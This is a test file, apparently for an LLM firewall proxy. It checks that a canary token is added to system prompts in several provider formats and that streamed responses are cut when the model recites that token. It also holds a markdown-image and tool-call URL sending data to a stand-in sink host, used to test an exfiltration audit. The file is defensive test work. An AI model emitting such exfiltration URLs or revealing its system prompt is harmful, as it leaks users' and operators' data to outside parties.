import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import fs from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { canaryToken, injectCanary, CanaryWatch, sseStreamText } from '../../src/proxy/canary.js'
import { getParser } from '../../src/detection/parsers.js'

// #539: a token appended to the system prompt that the model has no reason to
// repeat. If it shows up in a response, the model is reciting its system
// prompt, and the proxy cuts the stream before the token reaches the client.

const TOKEN = 'llmfw-canary-0123456789abcdef0123456789abcdef'
const SYSTEM = 'You are the release assistant.'

describe('canaryToken', () => {
  let dir: string
  beforeEach(() => { dir = fs.mkdtempSync(join(tmpdir(), 'llm-fw-canary-')) })
  afterEach(() => fs.rmSync(dir, { recursive: true, force: true }))

  it('creates one token per install and returns the same one after', () => {
    const first = canaryToken(dir)
    expect(first).toMatch(/^llmfw-canary-[0-9a-f]{32}$/)
    expect(canaryToken(dir)).toBe(first)
    expect(fs.readFileSync(join(dir, 'canary.txt'), 'utf8').trim()).toBe(first)
  })

  it('differs between installs', () => {
    const other = fs.mkdtempSync(join(tmpdir(), 'llm-fw-canary-'))
    try { expect(canaryToken(other)).not.toBe(canaryToken(dir)) } finally { fs.rmSync(other, { recursive: true, force: true }) }
  })

  it('replaces a file that does not hold a well-formed token', () => {
    fs.writeFileSync(join(dir, 'canary.txt'), 'not a token\n')
    expect(canaryToken(dir)).toMatch(/^llmfw-canary-[0-9a-f]{32}$/)
  })
})

describe('injectCanary', () => {
  const systemOf = (path: string, body: string) => getParser(path)!.extractSystem!(body).join('\n')

  const cases: Array<[string, string, unknown]> = [
    ['Anthropic system string', '/v1/messages', { model: 'm', system: SYSTEM, messages: [{ role: 'user', content: 'hi' }] }],
    ['Anthropic system blocks', '/v1/messages', { model: 'm', system: [{ type: 'text', text: SYSTEM, cache_control: { type: 'ephemeral' } }], messages: [{ role: 'user', content: 'hi' }] }],
    ['OpenAI system message', '/v1/chat/completions', { model: 'm', messages: [{ role: 'system', content: SYSTEM }, { role: 'user', content: 'hi' }] }],
    ['OpenAI developer parts', '/v1/chat/completions', { model: 'm', messages: [{ role: 'developer', content: [{ type: 'text', text: SYSTEM }] }, { role: 'user', content: 'hi' }] }],
    ['Responses instructions', '/v1/responses', { model: 'm', instructions: SYSTEM, input: 'hi' }],
    ['Gemini systemInstruction', '/v1beta/models/g:generateContent', { systemInstruction: { parts: [{ text: SYSTEM }] }, contents: [{ role: 'user', parts: [{ text: 'hi' }] }] }],
    ['Cloud Code request.systemInstruction', '/v1internal:streamGenerateContent?alt=sse', { model: 'm', project: 'p', request: { systemInstruction: { parts: [{ text: SYSTEM }] }, contents: [{ role: 'user', parts: [{ text: 'hi' }] }] } }],
    ['Bedrock Converse system', '/model/m/converse', { system: [{ text: SYSTEM }], messages: [{ role: 'user', content: [{ text: 'hi' }] }] }],
  ]
  it.each(cases)('adds the token to the system prompt: %s', (_name, path, body) => {
    const out = injectCanary(path, JSON.stringify(body), TOKEN)
    expect(out).not.toBeNull()
    const system = systemOf(path, out!)
    expect(system).toContain(SYSTEM)
    expect(system).toContain(TOKEN)
    // The user's turn is untouched.
    expect(getParser(path)!.extractPrompts(out!).filter(p => p === 'hi')).toHaveLength(1)
  })

  it('is byte-identical across requests, so the prompt cache prefix stays stable', () => {
    const body = JSON.stringify(cases[0]![2])
    expect(injectCanary('/v1/messages', body, TOKEN)).toBe(injectCanary('/v1/messages', body, TOKEN))
  })

  it('leaves a request without a system prompt alone: there is nothing to leak', () => {
    expect(injectCanary('/v1/messages', JSON.stringify({ model: 'm', messages: [{ role: 'user', content: 'hi' }] }), TOKEN)).toBeNull()
    expect(injectCanary('/v1/chat/completions', JSON.stringify({ model: 'm', messages: [{ role: 'user', content: 'hi' }] }), TOKEN)).toBeNull()
  })

  it('leaves a body it cannot read alone', () => {
    expect(injectCanary('/v1/messages', 'not json', TOKEN)).toBeNull()
    expect(injectCanary('/unknown/path', JSON.stringify({ system: SYSTEM }), TOKEN)).toBeNull()
  })
})

describe('CanaryWatch', () => {
  const anthropicDelta = (text: string) => `event: content_block_delta\ndata: ${JSON.stringify({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text } })}\n\n`
  const openAiDelta = (content: string) => `data: ${JSON.stringify({ choices: [{ index: 0, delta: { content } }] })}\n\n`

  it('fires on the event that completes the token, across text deltas', () => {
    const watch = new CanaryWatch(TOKEN)
    expect(watch.push(anthropicDelta('My instructions say: '))).toBe(false)
    expect(watch.push(anthropicDelta(TOKEN.slice(0, 20)))).toBe(false)
    expect(watch.push(anthropicDelta(TOKEN.slice(20)))).toBe(true)
  })

  it('fires when an event is split across network chunks', () => {
    const watch = new CanaryWatch(TOKEN)
    const stream = openAiDelta('Sure. ') + openAiDelta(TOKEN.slice(0, 7)) + openAiDelta(TOKEN.slice(7)) + 'data: [DONE]\n\n'
    let hit = false
    for (let i = 0; i < stream.length && !hit; i += 5) hit = watch.push(stream.slice(i, i + 5))
    expect(hit).toBe(true)
  })

  it('stays quiet on a stream that never carries the token', () => {
    const watch = new CanaryWatch(TOKEN)
    for (const t of ['llmfw-', 'canary-', 'is a word', ' 0123456789abcdef']) expect(watch.push(anthropicDelta(t))).toBe(false)
  })

  it('reads the token in tool arguments too', () => {
    const watch = new CanaryWatch(TOKEN)
    const ev = `event: content_block_delta\ndata: ${JSON.stringify({ type: 'content_block_delta', index: 1, delta: { type: 'input_json_delta', partial_json: `{"note":"${TOKEN}"}` } })}\n\n`
    expect(watch.push(ev)).toBe(true)
  })
})

// #674: the end-of-stream exfil audit reads this, so a URL split across
// deltas, in text or in tool-call arguments, is whole.
describe('sseStreamText', () => {
  const ev = (data: unknown) => `event: x\ndata: ${JSON.stringify(data)}\n\n`
  it('joins text and tool-call argument deltas, decoded, in order', () => {
    const sse = ev({ type: 'message_start', message: { id: 'msg_1', model: 'claude-x' } })
      + ev({ type: 'content_block_delta', delta: { type: 'text_delta', text: '![a](https://sink.example/a-' } })
      + ev({ type: 'content_block_delta', delta: { type: 'text_delta', text: '1?d=s&t)' } })
      + ev({ type: 'content_block_delta', delta: { type: 'input_json_delta', partial_json: '{"url":"https://sink.example/' } })
      + ev({ type: 'content_block_delta', delta: { type: 'input_json_delta', partial_json: 'b"}' } })
      + 'data: [DONE]\n\n'
    expect(sseStreamText(sse)).toBe('![a](https://sink.example/a-1?d=s&t){"url":"https://sink.example/b"}')
  })
  it('reads CRLF-separated events', () => {
    expect(sseStreamText('data: {"delta":"a"}\r\n\r\ndata: {"delta":"b"}\r\n\r\n')).toBe('ab')
  })
})

// #859: the watch split events on LF only, so a CRLF stream (as an SSE
// server may send) never yielded one event and carried the token through,
// while its buffer grew with the whole stream. A final event with no blank
// line after it was never read, and the token file was read from disk on
// every inspected request.
describe('CanaryWatch on CRLF streams and at end of stream (#859)', () => {
  const crlf = (text: string) => `event: content_block_delta\r\ndata: ${JSON.stringify({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text } })}\r\n\r\n`

  it('fires on a CRLF stream, across deltas', () => {
    const watch = new CanaryWatch(TOKEN)
    expect(watch.push(crlf('Sure: '))).toBe(false)
    expect(watch.push(crlf(TOKEN.slice(0, 15)))).toBe(false)
    expect(watch.push(crlf(TOKEN.slice(15)))).toBe(true)
  })

  it('fires on a CRLF stream split across network chunks', () => {
    const watch = new CanaryWatch(TOKEN)
    const stream = crlf('a ') + crlf(TOKEN.slice(0, 9)) + crlf(TOKEN.slice(9))
    let hit = false
    for (let i = 0; i < stream.length && !hit; i += 3) hit = watch.push(stream.slice(i, i + 3))
    expect(hit).toBe(true)
  })

  it('reads a final event that has no blank line after it', () => {
    const watch = new CanaryWatch(TOKEN)
    expect(watch.push(crlf('x ') + crlf(TOKEN.slice(0, 10)) + crlf(TOKEN.slice(10)).replace(/\r\n\r\n$/, ''))).toBe(false)
    expect(watch.flush()).toBe(true)
  })

  it('stays quiet at the end of a clean stream', () => {
    const watch = new CanaryWatch(TOKEN)
    watch.push(crlf('nothing to see'))
    expect(watch.flush()).toBe(false)
  })

  it('still finds the token in one event that never ends, past its buffer cap', () => {
    const watch = new CanaryWatch(TOKEN)
    let hit = watch.push('data: {"type":"content_block_delta","delta":{"text":"')
    for (let i = 0; i < 40 && !hit; i++) hit = watch.push('filler '.repeat(10_000))
    hit = hit || watch.push(TOKEN)
    expect(hit || watch.flush()).toBe(true)
  })
})

describe('canaryToken is read from disk once per directory (#859)', () => {
  let dir: string
  beforeEach(() => { dir = fs.mkdtempSync(join(tmpdir(), 'llm-fw-canary-')) })
  afterEach(() => fs.rmSync(dir, { recursive: true, force: true }))

  it('returns the token it first read, without reading the file again', () => {
    const first = canaryToken(dir)
    fs.writeFileSync(join(dir, 'canary.txt'), 'llmfw-canary-' + '0'.repeat(32) + '\n')
    expect(canaryToken(dir)).toBe(first)
  })
})
